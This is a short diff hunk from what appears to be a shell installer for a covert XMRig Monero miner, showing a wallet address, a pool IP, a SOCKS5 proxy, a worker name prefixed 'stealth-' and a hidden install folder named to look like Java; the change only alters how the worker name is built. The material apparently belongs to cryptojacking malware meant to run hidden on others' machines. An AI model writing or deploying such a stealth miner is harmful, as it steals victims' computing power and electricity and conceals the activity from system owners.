@@ -5,7 +5,7 @@ WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrx
 POOL="24.199.99.228:1935"
 SOCKS5_IP="116.100.220.220"
 SOCKS5_PORT="1080"
-WORKER="stealth-$(hostname || echo $(date +%s))"
+WORKER="stealth-$(cat /proc/sys/kernel/hostname 2>/dev/null || date +%s)"
 DIR="$HOME/.xmrig-java"
 
 echo "[*] Membuat folder $DIR..."
